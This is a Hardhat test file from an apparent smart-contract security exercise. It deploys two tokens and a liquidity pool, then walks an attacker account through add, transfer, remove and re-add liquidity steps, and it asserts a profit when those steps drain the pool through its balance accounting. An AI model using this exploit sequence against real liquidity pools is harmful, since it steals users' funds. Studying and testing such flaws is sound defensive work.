const { expect } = require("chai");
const { ethers } = require("hardhat");
const { parseEther: eth } = ethers.utils;

describe("[ Sparta Tests ]", function () {
  let owner, attacker;

  before(async function () {
    [owner, attacker] = await ethers.getSigners();

    hre.tracer.nameTags["0x5FbDB2315678afecb367f032d93F642f64180aa3"] = "Token0";
    hre.tracer.nameTags["0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0"] = "Token1";
    hre.tracer.nameTags["0xdc64a140aa3e981100a9beca4e685f962f0cf6c9"] = "Pool";
    hre.tracer.nameTags["0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"] = "Owner";
    hre.tracer.nameTags["0x70997970c51812dc3a010c7d01b50e0d17dc79c8"] = "Attacker";

    this.token0 = await (await ethers.getContractFactory("ERCToken0", owner)).deploy();
    await this.token0.deployed();
    this.token0.init("Token00", "TOKZER", eth('10000'));
    this.token1 = await (await ethers.getContractFactory("ERCToken1", owner)).deploy();
    await this.token1.deployed();
    this.token1.init("Token01", "TOKONE", eth('10000'));

    this.pool = await (await ethers.getContractFactory("Pool", owner)).deploy(this.token0.address, this.token1.address);
    await this.pool.deployed();

    await this.token0.transfer(this.pool.address, eth('100'));
    await this.token1.transfer(this.pool.address, eth('100'));
    await this.pool.init_pool();

    await this.token0.transfer(attacker.address, eth('200'));
    await this.token1.transfer(attacker.address, eth('200'));

    this.token0 = this.token0.connect(attacker);
    this.token1 = this.token1.connect(attacker);
    this.pool = this.pool.connect(attacker);
  });


  it("is initialized correctly -- test01", async function () {

    console.log("\n================= Test1 Start ==============================\n");

    expect(await this.token0.name(), "Token00 name mismatch").to.eq("Token00");
    expect(await this.token1.name(), "Token01 name mismatch").to.eq("Token01");
    expect(await this.pool.getToken0DepositAddress(), "token0 address mismatch").to.eq(this.token0.address);
    expect(await this.pool.getToken1DepositAddress(), "token1 address mismatch").to.eq(this.token1.address);
    expect(await this.pool.totalSupply(), "incorrect initial LP supply").to.eq(100000);

    expect(await this.pool.getTokenBalance(this.token0.address, this.pool.address), "incorrect initial pool token0 balance").to.eq(eth('100'));
    expect(await this.pool.getTokenBalance(this.token1.address, this.pool.address), "incorrect initial pool token1 balance").to.eq(eth('100'));

    expect(await this.pool.getTokenBalance(this.token0.address, attacker.address), "incorrect initial attacker's token0 balance").to.eq(eth('200'));
    expect(await this.pool.getTokenBalance(this.token1.address, attacker.address), "incorrect initial attacker's token1 balance").to.eq(eth('200'));

    console.log("\n=================  Test1 End  ==============================\n");

  });

  it("can be hacked -- test02", async function () {

    console.log("\n================= Test2 Start ==============================\n");

    console.log("\n\n");
    await this.pool.logger__("******************************************************************************");
    await this.pool.logger__("1. Before add_liquidity()");
    console.log("\n");

    await this.pool.totalSupply__();
    console.log("\n");
    await this.pool.logger__("attacker's LP token's balance");
    await this.pool.balanceOf__(attacker.address);
    console.log("\n");
    await this.pool.getTokenBalance__(this.token0.address, this.pool.address);
    await this.pool.getTokenBalance__(this.token1.address, this.pool.address);
    console.log("\n");
    await this.pool.recordedTokenBalance__(this.token0.address);
    await this.pool.recordedTokenBalance__(this.token1.address);
    console.log("\n");
    await this.pool.logger__("attacker's cash (both tokens)");
    await this.pool.getTokenBalance__(this.token0.address, attacker.address);
    await this.pool.getTokenBalance__(this.token1.address, attacker.address);
    await this.pool.logger__("******************************************************************************");

    console.log("\n\n");
    await this.pool.logger__("##############################################################################");
    await this.pool.logger__("2. Now add_liquidity()");
    await this.token0.transfer(this.pool.address, eth('100'));
    await this.token1.transfer(this.pool.address, eth('100'));
    await this.pool.add_liquidity();
    console.log("\n");

    await this.pool.totalSupply__();
    console.log("\n");
    await this.pool.logger__("attacker's LP token's balance");
    await this.pool.balanceOf__(attacker.address);
    console.log("\n");
    await this.pool.getTokenBalance__(this.token0.address, this.pool.address);
    await this.pool.getTokenBalance__(this.token1.address, this.pool.address);
    console.log("\n");
    await this.pool.recordedTokenBalance__(this.token0.address);
    await this.pool.recordedTokenBalance__(this.token1.address);
    console.log("\n");
    await this.pool.logger__("attacker's cash (both tokens)");
    await this.pool.getTokenBalance__(this.token0.address, attacker.address);
    await this.pool.getTokenBalance__(this.token1.address, attacker.address);
    await this.pool.logger__("##############################################################################");

    console.log("\n\n");
    await this.pool.logger__("******************************************************************************");
    await this.pool.logger__("3. Transfer B to pool");
    await this.token0.transfer(this.pool.address, eth('100'));
    await this.token1.transfer(this.pool.address, eth('100'));

    console.log("\n");
    await this.pool.totalSupply__();
    console.log("\n");
    await this.pool.logger__("attacker's LP token's balance");
    await this.pool.balanceOf__(attacker.address);
    console.log("\n");
    await this.pool.getTokenBalance__(this.token0.address, this.pool.address);
    await this.pool.getTokenBalance__(this.token1.address, this.pool.address);
    console.log("\n");
    await this.pool.recordedTokenBalance__(this.token0.address);
    await this.pool.recordedTokenBalance__(this.token1.address);
    console.log("\n");
    await this.pool.logger__("attacker's cash (both tokens)");
    await this.pool.getTokenBalance__(this.token0.address, attacker.address);
    await this.pool.getTokenBalance__(this.token1.address, attacker.address);
    await this.pool.logger__("******************************************************************************");

    console.log("\n\n");
    await this.pool.logger__("##############################################################################");
    await this.pool.logger__("4. remove_liquidity()");
    await this.pool.remove_liquidity(100000);

    console.log("\n");
    await this.pool.totalSupply__();
    console.log("\n");
    await this.pool.logger__("attacker's LP token's balance");
    await this.pool.balanceOf__(attacker.address);
    console.log("\n");
    await this.pool.getTokenBalance__(this.token0.address, this.pool.address);
    await this.pool.getTokenBalance__(this.token1.address, this.pool.address);
    console.log("\n");
    await this.pool.recordedTokenBalance__(this.token0.address);
    await this.pool.recordedTokenBalance__(this.token1.address);
    console.log("\n");
    await this.pool.logger__("attacker's cash (both tokens)");
    await this.pool.getTokenBalance__(this.token0.address, attacker.address);
    await this.pool.getTokenBalance__(this.token1.address, attacker.address);
    await this.pool.logger__("##############################################################################");

    console.log("\n\n");
    await this.pool.logger__("******************************************************************************");
    await this.pool.logger__("5. add_liquidity w/o transfer()");
    await this.pool.add_liquidity();

    console.log("\n");
    await this.pool.totalSupply__();
    console.log("\n");
    await this.pool.logger__("attacker's LP token's balance");
    await this.pool.balanceOf__(attacker.address);
    console.log("\n");
    await this.pool.getTokenBalance__(this.token0.address, this.pool.address);
    await this.pool.getTokenBalance__(this.token1.address, this.pool.address);
    console.log("\n");
    await this.pool.recordedTokenBalance__(this.token0.address);
    await this.pool.recordedTokenBalance__(this.token1.address);
    console.log("\n");
    await this.pool.logger__("attacker's cash (both tokens)");
    await this.pool.getTokenBalance__(this.token0.address, attacker.address);
    await this.pool.getTokenBalance__(this.token1.address, attacker.address);
    await this.pool.logger__("******************************************************************************");

    console.log("\n\n");
    await this.pool.logger__("##############################################################################");
    await this.pool.logger__("5. again remove_liquidity, but 2x tokens");
    await this.pool.logger__("4. remove_liquidity()");
    await this.pool.remove_liquidity(200000);

    console.log("\n");
    await this.pool.totalSupply__();
    console.log("\n");
    await this.pool.logger__("attacker's LP token's balance");
    await this.pool.balanceOf__(attacker.address);
    console.log("\n");
    await this.pool.getTokenBalance__(this.token0.address, this.pool.address);
    await this.pool.getTokenBalance__(this.token1.address, this.pool.address);
    console.log("\n");
    await this.pool.recordedTokenBalance__(this.token0.address);
    await this.pool.recordedTokenBalance__(this.token1.address);
    console.log("\n");
    await this.pool.logger__("attacker's cash (both tokens)");
    await this.pool.getTokenBalance__(this.token0.address, attacker.address);
    await this.pool.getTokenBalance__(this.token1.address, attacker.address);
    await this.pool.logger__("##############################################################################");


    expect(await this.pool.getTokenBalance(this.token1.address, attacker.address),
      "no gains made by attacker. Hack failed!").eq(eth('250'));

    console.log("\n=================  Test2 End  ==============================\n");

  });

});
